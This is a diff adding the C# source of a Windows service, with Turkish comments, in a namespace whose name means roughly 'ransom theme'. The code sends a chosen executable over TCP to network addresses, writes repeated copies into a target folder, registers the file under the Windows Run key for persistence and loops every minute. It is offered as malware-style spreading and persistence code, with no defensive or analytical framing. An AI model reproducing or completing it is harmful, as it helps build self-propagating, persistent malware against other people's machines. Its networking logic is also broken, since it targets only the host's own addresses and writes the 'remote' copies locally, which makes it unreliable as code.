@@ -1,0 +1,152 @@
+using Microsoft.Win32;
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net.Sockets;
+using System.Net;
+using System.ServiceProcess;
+
+namespace tema_fidye
+{
+    internal class FileInjectorService : ServiceBase
+    {
+        private string targetFolderPath = "C:\\TargetFolder"; // Enjekte etmek istediğiniz hedef klasör yolu
+        private string fileToInjectPath = "C:\\Path\\To\\FileToInject.exe"; // Enjekte etmek istediğiniz dosyanın yolu
+
+        private bool stopRequested = false;
+
+        public FileInjectorService()
+        {
+            InitializeComponent();
+        }
+
+        private void InitializeComponent()
+        {
+            // InitializeComponent metodu gerektiği gibi gerçekleştirilmeli
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            // Hizmet başladığında enjeksiyon işlemini başlat
+            PerformInjection();
+        }
+
+        protected override void OnStop()
+        {
+            // Hizmet durdurulduğunda enjeksiyon işlemini durdur
+            stopRequested = true;
+        }
+
+        private void PerformInjection()
+        {
+            // Hedef IP adreslerini almak için uygun bir yöntem kullanmanız gerekebilir.
+            string[] reachableIPs = GetReachableIPAddresses();
+
+            // Her bir IP adresine dosya enjekte etme
+            foreach (string ip in reachableIPs)
+            {
+                bool injectionSuccess = InjectFileToComputer(ip, targetFolderPath, fileToInjectPath);
+
+                if (injectionSuccess)
+                {
+                    EventLog.WriteEntry("FileInjectorService", "Dosya enjeksiyonu başarılı: " + ip, EventLogEntryType.Information);
+                }
+                else
+                {
+                    EventLog.WriteEntry("FileInjectorService", "Dosya enjeksiyonu başarısız: " + ip, EventLogEntryType.Warning);
+                }
+            }
+
+            // Kaydedilen dosyanın başlangıçta otomatik olarak çalışmasını sağlama
+            string savedFilePath = Path.Combine(targetFolderPath, Path.GetFileName(fileToInjectPath));
+            SetStartupRegistry(savedFilePath);
+
+            // Dosya enjeksiyonu durdurulmadığı sürece işlemi tekrarla
+            if (!stopRequested)
+            {
+                System.Threading.Thread.Sleep(60000); // 1 dakika bekle
+                PerformInjection();
+            }
+        }
+
+        private string[] GetReachableIPAddresses()
+        {
+            string[] ips = new string[0];
+
+            try
+            {
+                string hostName = Dns.GetHostName();
+                IPHostEntry hostEntry = Dns.GetHostEntry(hostName);
+
+                foreach (IPAddress ip in hostEntry.AddressList)
+                {
+                    if (ip.AddressFamily == AddressFamily.InterNetwork)
+                    {
+                        Array.Resize(ref ips, ips.Length + 1);
+                        ips[ips.Length - 1] = ip.ToString();
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                EventLog.WriteEntry("FileInjectorService", "Hata: " + ex.Message, EventLogEntryType.Error);
+            }
+
+            return ips;
+        }
+
+        private bool InjectFileToComputer(string ipAddress, string targetFolderPath, string fileToInjectPath)
+        {
+            try
+            {
+                // Hedef bilgisayara ağ üzerinden bağlantı oluşturma
+                using (TcpClient client = new TcpClient(ipAddress, 8080))
+                {
+                    // Enjekte etmek istediğiniz dosyayı okuma
+                    byte[] fileBytes = File.ReadAllBytes(fileToInjectPath);
+
+                    // Hedef bilgisayara dosyayı gönderme
+                    using (NetworkStream stream = client.GetStream())
+                    {
+                        stream.Write(fileBytes, 0, fileBytes.Length);
+                    }
+
+                    // Hedef bilgisayarda dosyayı birden fazla kez kaydetme
+                    string fileName = Path.GetFileName(fileToInjectPath);
+                    for (int i = 0; i < 5; i++)
+                    {
+                        string targetFilePath = Path.Combine(targetFolderPath, $"{i}_{fileName}");
+                        File.WriteAllBytes(targetFilePath, fileBytes);
+                    }
+
+                    return true;
+                }
+            }
+            catch (Exception ex)
+            {
+                EventLog.WriteEntry("FileInjectorService", "Hata: " + ex.Message, EventLogEntryType.Error);
+                return false;
+            }
+        }
+
+        private void SetStartupRegistry(string filePath)
+        {
+            try
+            {
+                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                rk.SetValue("MyApp", filePath);
+            }
+            catch (Exception ex)
+            {
+                EventLog.WriteEntry("FileInjectorService", "Hata: " + ex.Message, EventLogEntryType.Error);
+            }
+        }
+
+        static void Main()
+        {
+            ServiceBase.Run(new FileInjectorService());
+        }
+
+        internal void Start() => throw new NotImplementedException();
+    }
+}
